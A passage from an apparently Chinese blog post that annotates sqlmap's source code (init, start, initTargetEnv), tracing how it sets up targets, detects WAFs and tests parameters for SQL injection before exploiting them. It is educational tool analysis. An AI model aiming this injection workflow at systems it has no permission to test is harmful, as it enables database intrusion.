class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Set attributes into both configuration and knowledge base singletons</span></span><br><span class="line"><span class="string">    based upon command line and configuration file options.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 设置属性，基于命令行和配置文件选项。</span></span><br><span class="line">    _useWizardInterface() <span class="comment"># 用户向导程序</span></span><br><span class="line">    setVerbosity() <span class="comment"># 设置debug等级</span></span><br><span class="line">    _saveConfig() <span class="comment"># 将命令行选项保存到sqlmap配置INI文件中</span></span><br><span class="line">    _setRequestFromFile() <span class="comment"># 设置http请求从文件中</span></span><br><span class="line">    _cleanupOptions() <span class="comment"># 清理配置选项</span></span><br><span class="line">    _cleanupEnvironment() <span class="comment"># 清理环境</span></span><br><span class="line">    _dirtyPatches() <span class="comment"># 补丁相关</span></span><br><span class="line">    _purgeOutput() <span class="comment"># 安全删除(purges)输出目录。</span></span><br><span class="line">    _checkDependencies() <span class="comment"># 检测丢失的依赖</span></span><br><span class="line">    _createTemporaryDirectory() <span class="comment"># 创建运行的临时目录</span></span><br><span class="line">    _basicOptionValidation() <span class="comment"># 检测选项是否有效</span></span><br><span class="line">    _setProxyList() <span class="comment"># 设置代理列表</span></span><br><span class="line">    _setTorProxySettings() <span class="comment"># 设置Tor代理</span></span><br><span class="line">    _setDNSServer() <span class="comment"># 设置DNS服务器</span></span><br><span class="line">    _adjustLoggingFormatter() <span class="comment"># 调整日志格式</span></span><br><span class="line">    _setMultipleTargets() <span class="comment"># 如果在多个目标中运行，只定义一种参数</span></span><br><span class="line">    _setTamperingFunctions() <span class="comment"># 设置tamper脚本</span></span><br><span class="line">    _setWafFunctions() <span class="comment"># 载入waf检测脚本</span></span><br><span class="line">    _setTrafficOutputFP() <span class="comment"># 设置记录http日志文件</span></span><br><span class="line">    _setupHTTPCollector() <span class="comment"># 清理http收集</span></span><br><span class="line">    _resolveCrossReferences()</span><br><span class="line">    _checkWebSocket() <span class="comment"># 检测websocket-client模块调用</span></span><br><span class="line">    parseTargetUrl() <span class="comment"># 解析目标url</span></span><br><span class="line">    parseTargetDirect() <span class="comment"># 解析目标DBMS</span></span><br><span class="line">    <span class="keyword">if</span> any((conf.url, conf.logFile, conf.bulkFile, conf.sitemapUrl, conf.requestFile, conf.googleDork, conf.liveTest)):</span><br><span class="line">        <span class="comment"># 如果设置了上述选项，配置相关http</span></span><br><span class="line">        _setHTTPTimeout() <span class="comment"># 设置超时</span></span><br><span class="line">        _setHTTPExtraHeaders() <span class="comment"># 设置Headers</span></span><br><span class="line">        _setHTTPCookies() <span class="comment"># 设置Cookies</span></span><br><span class="line">        _setHTTPReferer() <span class="comment"># 设置Referer</span></span><br><span class="line">        _setHTTPHost() <span class="comment"># 设置Host</span></span><br><span class="line">        _setHTTPUserAgent() <span class="comment"># 设置UserAgent</span></span><br><span class="line">        _setHTTPAuthentication() <span class="comment"># 设置HTTPAuthentication</span></span><br><span class="line">        _setHTTPHandlers() <span class="comment"># 检查并设置所有HTTP请求的HTTP / SOCKS代理。</span></span><br><span class="line">        _setDNSCache() <span class="comment"># 设置DNS缓存</span></span><br><span class="line">        _setSocketPreConnect()</span><br><span class="line">        _setSafeVisit() <span class="comment"># 检查并设置安全访问选项。</span></span><br><span class="line">        _doSearch() <span class="comment"># 使用搜索平台搜索结果并存储</span></span><br><span class="line">        _setBulkMultipleTargets()</span><br><span class="line">        _setSitemapTargets() <span class="comment"># 解析SitemapTargets中的目标</span></span><br><span class="line">        _checkTor() <span class="comment"># 检测Tor</span></span><br><span class="line">        _setCrawler() <span class="comment"># 设置爬虫</span></span><br><span class="line">        _findPageForms() <span class="comment"># 寻找网页的表单</span></span><br><span class="line">        _setDBMS() <span class="comment"># 强制DBMS选项</span></span><br><span class="line">        _setTechnique()</span><br><span class="line">    _setThreads() <span class="comment"># 设置现场</span></span><br><span class="line">    _setOS() <span class="comment"># 强制OS</span></span><br><span class="line">    _setWriteFile() <span class="comment"># 写入文件</span></span><br><span class="line">    _setMetasploit() <span class="comment"># Metasploit相关设置</span></span><br><span class="line">    _setDBMSAuthentication()</span><br><span class="line">    loadBoundaries() <span class="comment"># 载入Boundaries</span></span><br><span class="line">    loadPayloads() <span class="comment"># 载入Payloads</span></span><br><span class="line">    _setPrefixSuffix() <span class="comment"># 设置前后缀</span></span><br><span class="line">    update() <span class="comment"># 更新sqlmap</span></span><br><span class="line">    _loadQueries() <span class="comment"># 加载查询的xml /查询</span></span><br></pre></td></tr></table></figure>

<p>这里就是很多更多的针对命令行的参数进行设置更新  </p>
<h5 id="init里一些有用的小技巧"><a href="#init里一些有用的小技巧" class="headerlink" title="init里一些有用的小技巧"></a>init里一些有用的小技巧</h5><p>看到一个设置socket发送小数据快一些的操作 针对大小数据不同性能选择的算法<br>会立即发送还是等待一定数据量再发送数据 获取更快的响应速度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># Reference: https://www.techrepublic.com/article/tcp-ip-options-for-high-performance-data-transmission/</span></span><br><span class="line">s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>还有再请求头添加设置不使用缓存而是获取最新的页面<br><code>conf.httpHeaders.append((HTTP_HEADER.CACHE_CONTROL, &quot;no-cache&quot;))</code>  </p>
<h4 id="sqlmap的测试框架"><a href="#sqlmap的测试框架" class="headerlink" title="sqlmap的测试框架"></a>sqlmap的测试框架</h4><p>确保功能 减少bug 每个新加功能或者修改保证对之前的功能没有影响<br>分为 覆盖测试 smokeTest<br>     注入功能测试 liveTest  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.smokeTest:</span><br><span class="line">    <span class="keyword">from</span> lib.core.testing <span class="keyword">import</span> smokeTest</span><br><span class="line">    smokeTest() <span class="comment"># 功能覆盖测试</span></span><br><span class="line"><span class="keyword">elif</span> conf.liveTest:</span><br><span class="line">    <span class="keyword">from</span> lib.core.testing <span class="keyword">import</span> liveTest</span><br><span class="line">    liveTest() <span class="comment"># 测试sqlmap的注入功能</span></span><br><span class="line">    <span class="comment"># livetests.xml里面加载用于测试注入功能的网站和配置样例，进行全面的注入测试</span></span><br></pre></td></tr></table></figure>

<h3 id="start-主要的函数"><a href="#start-主要的函数" class="headerlink" title="start() 主要的函数"></a>start() 主要的函数</h3><p>如果不是测试则导入 controller 里的start方法 并调用<br>这里的 profile 方法是用于图形化输出 程序运行的一些性能瓶颈等用于优化<br>可以直观的看出整个程序每个步骤的占用时间百分比，函数调用次数，颜色能直观的表示出瓶颈所在  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">from</span> lib.controller.controller <span class="keyword">import</span> start</span><br><span class="line"><span class="keyword">if</span> conf.profile:</span><br><span class="line">    <span class="keyword">from</span> lib.core.profiling <span class="keyword">import</span> profile</span><br><span class="line">    globals()[<span class="string">"start"</span>] = start</span><br><span class="line">    profile()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start()</span><br><span class="line">    <span class="keyword">except</span> thread.error <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"can't start new thread"</span> <span class="keyword">in</span> getSafeExString(ex):</span><br><span class="line">            errMsg = <span class="string">"unable to start new threads. Please check OS (u)limits"</span></span><br><span class="line">            logger.critical(errMsg)</span><br><span class="line">            <span class="keyword">raise</span> SystemExit</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br></pre></td></tr></table></figure>

<p>这个就是主要的测试注入的方法了  </p>
<p><strong>因为代码太长了 适当的删除了一些 不是很重要的代码</strong>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">检查url访问的稳定性以及所有的GET,POST,Cookie和UA里面的参数是否是动态参数，以便来进行注入测试</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> conf.hashFile: <span class="comment"># 创建文件hashFile</span></span><br><span class="line">        crackHashFile(conf.hashFile)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> conf.direct:  <span class="comment"># 这个是参数有 -d才会走到这一步 一开始我直接就跟入进去了 一直看花了挺长时间 这个直接连接数据库的时候 -d 指定才有进来 但是后面也有调用同样的函数</span></span><br><span class="line">        initTargetEnv()</span><br><span class="line">        <span class="comment"># 初始化目标环境</span></span><br><span class="line">        <span class="comment"># 里面会对用户--data参数的输入进行编码</span></span><br><span class="line">        setupTargetEnv()</span><br><span class="line">        <span class="comment"># 创建输出的目录 对目录权限的检测没有权限就改成临时目录</span></span><br><span class="line">        <span class="comment"># 看下面</span></span><br><span class="line">        action()</span><br><span class="line">        <span class="comment"># 如果指定了 -d 连接数据库</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> conf.url <span class="keyword">and</span> <span class="keyword">not</span> any((conf.forms, conf.crawlDepth)):</span><br><span class="line">        kb.targets.add((conf.url, conf.method, conf.data, conf.cookie, <span class="literal">None</span>))</span><br><span class="line">        <span class="comment"># 添加完是这样的</span></span><br><span class="line">        <span class="comment"># OrderedSet([(u'http://43.247.91.228:81/vulnerabilities/sqli/?id=1', None, None, u'PHPSESSID=p71qjlkrs95vhmlccvkbkko151; security=low', None)])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多个目标地址</span></span><br><span class="line">    <span class="keyword">if</span> kb.targets <span class="keyword">and</span> len(kb.targets) &gt; <span class="number">1</span>:</span><br><span class="line">        infoMsg = <span class="string">"sqlmap got a total of %d targets"</span> % len(kb.targets)</span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> targetUrl, targetMethod, targetData, targetCookie, targetHeaders <span class="keyword">in</span> kb.targets:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 检验连接 是配置了参数 --check-internet才会执行</span></span><br><span class="line">            <span class="keyword">if</span> conf.checkInternet:</span><br><span class="line">                infoMsg = <span class="string">"checking for Internet connection"</span></span><br><span class="line">                logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 将测试目标的一些数据写到conf 存储</span></span><br><span class="line">            conf.url = targetUrl</span><br><span class="line">            conf.method = targetMethod.upper() <span class="keyword">if</span> targetMethod <span class="keyword">else</span> targetMethod</span><br><span class="line">            conf.data = targetData</span><br><span class="line">            conf.cookie = targetCookie</span><br><span class="line">            conf.httpHeaders = list(initialHeaders)</span><br><span class="line">            conf.httpHeaders.extend(targetHeaders <span class="keyword">or</span> [])</span><br><span class="line">            conf.httpHeaders = [conf.httpHeaders[i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(conf.httpHeaders)) <span class="keyword">if</span> conf.httpHeaders[i][<span class="number">0</span>].upper() <span class="keyword">not</span> <span class="keyword">in</span> (__[<span class="number">0</span>].upper() <span class="keyword">for</span> __ <span class="keyword">in</span> conf.httpHeaders[i + <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line">            initTargetEnv() </span><br><span class="line">            <span class="comment"># 见下面代码分析 主要是对目标地址环境的一些数据进行初始化</span></span><br><span class="line">            parseTargetUrl()</span><br><span class="line">            <span class="comment"># 简单解析下url 比如说 http 或者https等 </span></span><br><span class="line">            testSqlInj = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 下面就是针对 get的进行解析参数 key对应value  </span></span><br><span class="line">            <span class="comment"># parameter (u'id', u'1') 拿到参数</span></span><br><span class="line">            <span class="comment"># sqlmap使用了很多正则</span></span><br><span class="line">            <span class="comment"># 还要判断这个参数有没有测试过 </span></span><br><span class="line">            <span class="keyword">if</span> PLACE.GET <span class="keyword">in</span> conf.parameters <span class="keyword">and</span> <span class="keyword">not</span> any([conf.data, conf.testParameter]):</span><br><span class="line">                <span class="keyword">for</span> parameter <span class="keyword">in</span> re.findall(<span class="string">r"([^=]+)=([^%s]+%s?|\Z)"</span> % (re.escape(conf.paramDel <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">or</span> DEFAULT_GET_POST_DELIMITER, re.escape(conf.paramDel <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">or</span> DEFAULT_GET_POST_DELIMITER), </span><br><span class="line">                conf.parameters[PLACE.GET]):</span><br><span class="line">                    paramKey = (conf.hostname, conf.path, PLACE.GET, parameter[<span class="number">0</span>])</span><br><span class="line">                    <span class="comment"># 如果这个参数没有测试过 设置测试并跳出循环</span></span><br><span class="line">                    <span class="keyword">if</span> paramKey <span class="keyword">not</span> <span class="keyword">in</span> kb.testedParams:</span><br><span class="line">                        testSqlInj = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                paramKey = (conf.hostname, conf.path, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">                <span class="keyword">if</span> paramKey <span class="keyword">not</span> <span class="keyword">in</span> kb.testedParams:</span><br><span class="line">                    testSqlInj = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># 就是之前跑过了已经存储了注入的信息了</span></span><br><span class="line">            <span class="keyword">if</span> testSqlInj <span class="keyword">and</span> conf.hostname <span class="keyword">in</span> kb.vulnHosts:</span><br><span class="line">                <span class="keyword">if</span> kb.skipVulnHost <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    message = <span class="string">"SQL injection vulnerability has already been detected "</span></span><br><span class="line">                    message += <span class="string">"against '%s'. Do you want to skip "</span> % conf.hostname</span><br><span class="line">                    message += <span class="string">"further tests involving it? [Y/n]"</span></span><br><span class="line"></span><br><span class="line">                    kb.skipVulnHost = readInput(message, default=<span class="string">'Y'</span>, boolean=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                testSqlInj = <span class="keyword">not</span> kb.skipVulnHost</span><br><span class="line">            <span class="comment"># 没有 也就是没有参数需要测试跳过</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> testSqlInj:</span><br><span class="line">                infoMsg = <span class="string">"skipping '%s'"</span> % targetUrl</span><br><span class="line">                logger.info(infoMsg)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 多个目标的话总计加1</span></span><br><span class="line">            <span class="comment"># 见下面分析</span></span><br><span class="line">            setupTargetEnv()</span><br><span class="line">            <span class="comment"># checkConnection 检验连接 就是输出测试目标地址可以连接的</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> checkConnection(suppressOutput=conf.forms) <span class="keyword">or</span> <span class="keyword">not</span> checkString() <span class="keyword">or</span> <span class="keyword">not</span> checkRegexp():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 见下面分析 检验是否存在waf</span></span><br><span class="line">            checkWaf()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> conf.identifyWaf:</span><br><span class="line">                identifyWaf()<span class="comment"># 使用waf识别脚本</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> any((conf.string, conf.notString, conf.regexp)) <span class="keyword">and</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">in</span> conf.tech:</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 检测页面是否稳定</span></span><br><span class="line">                    <span class="comment"># 同一页两次，每次请求内有小延迟</span></span><br><span class="line">                    <span class="comment"># 那么就假设它是稳定的。</span></span><br><span class="line">                    checkStability()</span><br><span class="line">                    <span class="comment"># [19:18:35] [INFO] testing if the target URL content is stable</span></span><br><span class="line">                    <span class="comment"># [19:18:35] [INFO] target URL content is stable</span></span><br><span class="line">                <span class="comment">#对可测试参数列表进行一些优先级排序</span></span><br><span class="line">                parameters = conf.parameters.keys()</span><br><span class="line"></span><br><span class="line">                <span class="comment">#测试列表顺序（从前到后）</span></span><br><span class="line">                orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)</span><br><span class="line">                <span class="comment"># 对于设置的测试级别解析不能的地方 比如 referer cookie host等 </span></span><br><span class="line">                <span class="comment"># 根据命令行参数等是否跳过一些参数</span></span><br><span class="line">                        ..........</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">elif</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">in</span> conf.tech <span class="keyword">or</span> conf.skipStatic:</span><br><span class="line">                            <span class="comment"># 判断这个参数是不是动态的类似 ?id =1 与?id=2是不是一样的内容</span></span><br><span class="line">                            check = checkDynParam(place, parameter, value)</span><br><span class="line">                            <span class="comment"># 这里检测完会输出是否动态的</span></span><br><span class="line">                            <span class="keyword">if</span> <span class="keyword">not</span> check:</span><br><span class="line">                                warnMsg = <span class="string">"%s parameter '%s' does not appear to be dynamic"</span> % (paramType, parameter)</span><br><span class="line">                                logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> conf.skipStatic:</span><br><span class="line">                                    infoMsg = <span class="string">"skipping static %s parameter '%s'"</span> % (paramType, parameter)</span><br><span class="line">                                    logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                    testSqlInj = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                infoMsg = <span class="string">"%s parameter '%s' appears to be dynamic"</span> % (paramType, parameter)</span><br><span class="line">                                logger.info(infoMsg)</span><br><span class="line">                        <span class="comment"># 将参数添加到测试参数</span></span><br><span class="line">                        kb.testedParams.add(paramKey)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> testSqlInj: <span class="comment">#  开始测试注入 </span></span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                <span class="comment"># 详见下面分析</span></span><br><span class="line">                                <span class="comment"># 启发式检测sql注入</span></span><br><span class="line">                                check = heuristicCheckSqlInjection(place, parameter)</span><br><span class="line">                                <span class="comment"># 这里 返回 3 HEURISTIC_TEST.POSITIVE 也就是这个 启发式检测阳性 也就是成功</span></span><br><span class="line">                                <span class="keyword">if</span> check != HEURISTIC_TEST.POSITIVE: <span class="comment"># 不成功的话输出跳过这个参数</span></span><br><span class="line">                                    <span class="keyword">if</span> conf.smart <span class="keyword">or</span> (kb.ignoreCasted <span class="keyword">and</span> check == HEURISTIC_TEST.CASTED):</span><br><span class="line">                                        infoMsg = <span class="string">"skipping %s parameter '%s'"</span> % (paramType, parameter)</span><br><span class="line">                                        logger.info(infoMsg)</span><br><span class="line">                                        <span class="keyword">continue</span></span><br><span class="line">                                <span class="comment"># 输出开始注入测试</span></span><br><span class="line">                                infoMsg = <span class="string">"testing for SQL injection on %s "</span> % paramType</span><br><span class="line">                                infoMsg += <span class="string">"parameter '%s'"</span> % parameter</span><br><span class="line">                                logger.info(infoMsg)</span><br><span class="line">                                <span class="comment"># 真正检测注入的地方</span></span><br><span class="line">                                injection = checkSqlInjection(place, parameter, value)</span><br><span class="line">                                proceed = <span class="keyword">not</span> kb.endDetection</span><br><span class="line">                                injectable = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> getattr(injection, <span class="string">"place"</span>, <span class="literal">None</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                                    <span class="keyword">if</span> NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE <span class="keyword">in</span> injection.notes:</span><br><span class="line">                                        kb.falsePositives.append(injection)</span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        injectable = <span class="literal">True</span></span><br><span class="line">                                        <span class="comment"># 将注入成功的存储到kb里面</span></span><br><span class="line">                                        kb.injections.append(injection)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Flush the flag</span></span><br><span class="line">                kb.testMode = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                _saveToResultsFile()</span><br><span class="line">                _saveToHashDB()</span><br><span class="line">                _showInjections()</span><br><span class="line">                _selectInjection()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> kb.injection.place <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> kb.injection.parameter <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> conf.multipleTargets:</span><br><span class="line">                    message = <span class="string">"do you want to exploit this SQL injection? [Y/n] "</span></span><br><span class="line">                    condition = readInput(message, default=<span class="string">'Y'</span>, boolean=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    condition = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> condition:</span><br><span class="line">                    action()</span><br></pre></td></tr></table></figure>

<p>接下来具体跟入上面的几个函数  </p>
<h5 id="initTargetEnv"><a href="#initTargetEnv" class="headerlink" title="initTargetEnv()"></a>initTargetEnv()</h5><p>初始化目标环境 是否指定了数据库 是否有自定义注入点<br>例如: <code>sqlmap -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;</code><br>这里的星 还支持 <code>r&quot;(?i)%INJECT[_ ]?HERE%&quot;</code> 这种正则形式的 没有的话就是上面的 <code>*</code><br><code>from lib.core.target import initTargetEnv</code>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initTargetEnv</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    初始化目标环境.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> conf.multipleTargets:</span><br><span class="line">        <span class="keyword">if</span> conf.hashDB:</span><br><span class="line">            conf.hashDB.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> conf.cj:</span><br><span class="line">            resetCookieJar(conf.cj)</span><br><span class="line"></span><br><span class="line">        conf.paramDict = &#123;&#125;</span><br><span class="line">        conf.parameters = &#123;&#125;</span><br><span class="line">        conf.hashDBFile = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        _setKnowledgeBaseAttributes(<span class="literal">False</span>)</span><br><span class="line">        _restoreMergedOptions()</span><br><span class="line">        _setDBMS() <span class="comment"># 如果指定则使用指定的dbms 也就是数据库类型  </span></span><br><span class="line">        <span class="comment"># 要对传入的dbsm检测下后 conf.dbms = dbms  </span></span><br><span class="line">    <span class="keyword">if</span> conf.data:</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">_</span><span class="params">(unicode)</span>:</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        kb.postUrlEncode = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> conf.httpHeaders:</span><br><span class="line">            <span class="keyword">if</span> key.upper() == HTTP_HEADER.CONTENT_TYPE.upper():</span><br><span class="line">                kb.postUrlEncode = <span class="string">"urlencoded"</span> <span class="keyword">in</span> value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> kb.postUrlEncode:</span><br><span class="line">            <span class="comment"># 如果有 urlencoded 那么对数据进行urldecode编码处理  </span></span><br><span class="line">            original = conf.data</span><br><span class="line">            conf.data = _(urldecode(conf.data))</span><br><span class="line">            setattr(conf.data, UNENCODED_ORIGINAL_VALUE, original)</span><br><span class="line">            kb.postSpaceToPlus = <span class="string">'+'</span> <span class="keyword">in</span> original</span><br><span class="line"></span><br><span class="line">    match = re.search(INJECT_HERE_REGEX, conf.data <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">or</span> re.search(INJECT_HERE_REGEX, 